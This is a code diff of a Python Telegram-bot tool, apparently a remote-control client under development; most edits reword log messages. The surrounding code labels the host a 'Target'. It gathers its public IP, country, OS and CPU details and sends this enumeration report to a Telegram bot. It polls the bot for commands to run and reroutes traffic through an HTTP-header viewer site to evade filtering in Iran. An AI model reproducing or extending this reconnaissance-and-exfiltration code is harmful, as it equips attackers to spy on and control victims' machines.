@@ -26,14 +26,14 @@ class TeleManager():
     summary 
     this function obtain user ip and then send request to obtain user location
     then if User in Iran Show Warning Message
-    this is internal function to check location for decide using normal sending or bypassing 
+    this is internal function to check location to deciding using normal mode or bypassing mode for sending meesage 
         '''
         global userIp
         global userLocation
         try:
             userIp = requests.get('https://api.ipify.org').text
         except requests.ConnectionError or requests.RequestException:
-            print(Fore.LIGHTRED_EX + 'Cant Get machine IP address, seem Internet Connection Error')
+            print(Fore.LIGHTRED_EX + '[-] IP Enum => Cant Get machine IP address, seem Internet Connection Error')
             return False
         
         httpDebuggerUrl = 'https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx'
@@ -61,9 +61,10 @@ class TeleManager():
                 #Print Warning message and Country Code
                 if "IR" not in str(divTagResult):
                     return True
-                else:
-                    print(Fore.LIGHTGREEN_EX + f'You are in {ipCountry} Iran Unsupported Country => '+Fore.LIGHTCYAN_EX+f'So We Use Tunnel to sending Requests'+Style.RESET_ALL)
-                    print(Fore.LIGHTYELLOW_EX+"Request send using Tunnel."+Style.RESET_ALL)
+                elif "IR" in str(divTagResult):
+                    print(Fore.YELLOW + f'[+] IP Enum => You are in {ipCountry} and Iran is Unsupported Country => ' \
+                        +Fore.LIGHTCYAN_EX+f'So We Use Tunnel to sending Requests'+Style.RESET_ALL)
+                    print(Fore.LIGHTGREEN_EX+"[+] IP Enum => Request send using Tunnel."+Style.RESET_ALL)
                     return False
                 
                 #Store Results and Return
@@ -74,9 +75,10 @@ class TeleManager():
                     
         #Handle ip_eum() Errors
         except requests.ConnectionError or requests.RequestException:
-            print(Fore.LIGHTRED_EX + 'Internet Connection Error!!!'+Style.RESET_ALL)
-        except:
-            print(Fore.LIGHTRED_EX + 'Unknown error in IP Location Checking happened...')
+            print(Fore.LIGHTRED_EX + '[-] IP Enum => Internet Connection Error!!!'+Style.RESET_ALL)
+        except Exception as e:
+            print(Fore.LIGHTRED_EX + '[-] IP Enum => Unknown error in IP Location Checking happened!!! \n'+Style.RESET_ALL)
+            print(Fore.LIGHTWHITE_EX+f'Error Content: {e}'+Style.RESET_ALL)
         
     def send_message_normal_mode(self, msg):
         '''summary:
@@ -87,17 +89,21 @@ class TeleManager():
         try:
             response = requests.get(url)
             if response.status_code == 200:
-                print(Fore.LIGHTGREEN_EX + 'Message Sent Successfully on Normal Mode!')
+                print(Fore.LIGHTGREEN_EX + '[+] Message Sender => Message Sent Successfully on Normal Mode!'+Style.RESET_ALL)
                 return True
             else:
-                print(Fore.LIGHTRED_EX + 'Failed to send message. try again!!! Status code:' + Fore.LIGHTYELLOW_EX + response.status_code)
+                print(Fore.LIGHTRED_EX + '[-] Message Sender => Failed to send message. try again!!! Status code:' \
+                    + Fore.LIGHTYELLOW_EX + response.status_code)
         except requests.RequestException:
-            print(Fore.LIGHTRED_EX + 'Internet Connection Error!!!')
+            print(Fore.LIGHTRED_EX + '[-] Message Sender => Internet Connection Error!!!')
+        except Exception as e:
+            print(Fore.LIGHTRED_EX + '[-] Message Sender => Unknown error in IP Location Checking happened!!! \n'+Style.RESET_ALL)
+            print(Fore.LIGHTWHITE_EX+f'Error Content: {e}'+Style.RESET_ALL)
            
     def send_message_bypass_mode(self, msg): 
         '''summary:
         this function send message to telegram bot in Bypass Mode 
-        this function can Filtering in iran
+        actully function can Filtering in iran
         '''
         url = 'https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx'
         payload = {
@@ -110,12 +116,12 @@ class TeleManager():
         response = requests.post(url, data=payload)
         
         if response.status_code == 200:
-            print(Fore.LIGHTGREEN_EX + 'Message Sent Successfully!')
+            print(Fore.LIGHTGREEN_EX + '[+] Message Sender Bypass Mode => Message Sent Successfully!')
             return True
         
     def send_message(self, msg):
         '''summary:
-        this function send message to telegram bot base on country
+        this function deciding to send message to telegram bot base on country Code
         if client side Location(where python script is running) is Iran then use bypass mode
         '''
         if self.ip_enum():
@@ -132,14 +138,14 @@ class TeleManager():
         '''
 
         #Get User All Information
-        userInfo = platform.uname()
+        #userInfo = platform.uname()
 
         osCpu = subprocess.getoutput('wmic cpu get name')
         osCpuFormated = osCpu.replace('Name','').replace('\n','').replace(' ','')
         
         clienSideLoc = self.ip_enum()
         
-        osEnum = f''' Enumeration Completed: ✅
+        osEnum = f''' OS Enumeration Result: ✅
             Target {userIp} in {userLocation} =>
             Operation System: {platform.system()} 💻
             OS Versions: {platform.version()} 🆚 => {platform.release()} 📦
@@ -149,16 +155,18 @@ class TeleManager():
             OS Detailed Version: {platform.win32_ver()}
             
             ---------------\\\\*******//---------------
-            🥷 Hi Yakuza-Bot User 🥷👋
+            🥷 Hi Ninja .... 🥷👋
             Enter /list To See All Bot Commands 
             Enter /none to Run New Command
         '''
-        print(osEnum)
-        
-        if clienSideLoc:
+        print(Fore.LIGHTGREEN_EX+f'[+] OS Enum => \n'+Style.RESET_ALL+osEnum)
+         
+        if clienSideLoc: #client side not in iran
             self.send_message(osEnum)
-        else:
+            
+        else: #client side in iran
             self.send_message_bypass_mode(osEnum)
+            
         #sendMsg = self.send_message_bypass_mode(enumPm)
         return osEnum
         
@@ -192,10 +200,12 @@ class TeleManager():
                 
                 #Function return and Outputs
                 self.lastCommand = lastCmd
-                print(Fore.LIGHTGREEN_EX+f'Last Command from Bot: {self.lastCommand}'+Style.RESET_ALL)
+                print(Fore.LIGHTGREEN_EX+f'[+] Last Command Bypass Mode => from Bot: {self.lastCommand}'+Style.RESET_ALL)
                 return lastCmd
+        except requests.ConnectionError or requests.RequestException:
+            print(Fore.LIGHTRED_EX + '[-] Last Command Bypass Mode => Internet Connection Error!!!'+Style.RESET_ALL)
         except:
-            print(Fore.LIGHTMAGENTA_EX + 'Error in Last Command Checking Bypass Mode happened...'+Style.RESET_ALL)
+            print(Fore.LIGHTMAGENTA_EX + '[-] Last Command Bypass Mode => Unknown Error happened...'+Style.RESET_ALL)
                    
     def last_command_normal_mode(self):
         '''summary
@@ -207,20 +217,24 @@ class TeleManager():
             response = requests.get(url)
             if response.status_code == 200:
                 lastCmd = response.json()['result'][-1]['message']['text']
-                print(Fore.LIGHTGREEN_EX+f'Last Command from Bot: {lastCmd}'+Style.RESET_ALL)
+                print(Fore.LIGHTGREEN_EX+f'[+] Last Command => from Bot: {lastCmd}'+Style.RESET_ALL)
                 self.lastCommand = lastCmd
                 return lastCmd
-        except:
-            print(Fore.LIGHTMAGENTA_EX + 'Error in Last Command Checking happened...'+Style.RESET_ALL)
-      
+        
+        except requests.ConnectionError or requests.RequestException:
+            print(Fore.LIGHTRED_EX + '[-] Last Command => Internet Connection Error!!!'+Style.RESET_ALL)
+        
+        except Exception as e:
+            print(Fore.LIGHTRED_EX + '[-] Last Command => Unknown error in IP Location Checking happened!!! \n'+Style.RESET_ALL)
+            print(Fore.LIGHTWHITE_EX+f'Error Content: {e}'+Style.RESET_ALL)
        
     def last_command(self):
         '''summary
         This function get Last Command in Normal Mode
         '''
-        if self.ip_enum():
+        if self.ip_enum(): #client side not in iran
             self.last_command_normal_mode()
-        else:
+        else: #client side in iran
             self.last_command_bypass_mode()
             
     def list_command(self):
@@ -230,17 +244,19 @@ class TeleManager():
         #subprocess.Popen('neofetch')
         #os.system('neofetch')
         
-        listCmd = '''
-        /list => Show List of Commands
-        /send => Send New Message
-        /none => Run New Command
-        /os => Get OS Information
-        /ip => Get IP Information
-        /help => Get Help
-        /exit => Exit from Bot
+        listCmd = f'''
+        /list => Show List of Commands \n
+        /send => Send New Message \n
+        /none => Run New Command \n
+        /os => Get OS Information \n
+        /ip => Get IP Information \n
+        /help => Get Help \n
+        /exit => Exit from Bot \n
         '''
         print(Back.MAGENTA+Fore.LIGHTWHITE_EX+listCmd+Style.RESET_ALL)
+        return listCmd
         #self.send_message(listCmd)
+        #self.allCommands.append(listCmd)
     
     def usage_options(self):
         options = '''
@@ -279,15 +295,15 @@ class TeleManager():
         elif userInput == '99':
             self.exit_bot()
         else:
-            print(Fore.LIGHTRED_EX + 'Invalid Command!!!')
+            print(Fore.LIGHTRED_EX + '[-] Usage Options => Invalid Command!!!'+Style.RESET_ALL)
             self.usage_options()
             
     def exit_bot(self):
         '''summary
         This function exit from Bot
         '''
-        print(Fore.LIGHTBLUE_EX + 'Goodbye Ninja 🥷.... 👋 👋 👋'+Style.RESET_ALL)
-        self.send_message('Client Side python script Shuting down...!')
+        print(Fore.CYAN + 'Goodbye Ninja 🥷.... 👋 👋 👋\n'+Style.RESET_ALL)
+        self.send_message('Client Side python script Shuting down...! 📴 ')
         exit()
         
 
@@ -303,7 +319,7 @@ def bot_runner():
     while True:
         option = telegram.usage_options()
         if option[0] == 'send':
-            msg = input(Fore.LIGHTCYAN_EX+'Enter your message: '+Style.RESET_ALL)
+            msg = input(Fore.YELLOW+'Enter your message: '+Style.RESET_ALL)
             telegram.send_message(msg)
             continue
             
@@ -319,10 +335,9 @@ def bot_runner():
             telegram.last_command()
             continue
             
-        elif option[0] == 'allcmd':
+        elif option[0] == 'allcmd':  #Check this Condition (all commands)
             print(telegram.allCommands)
             telegram.all_command_normal_mode()
-            print(telegram.allCommands)
             continue
 
         elif option[0] == 'help':
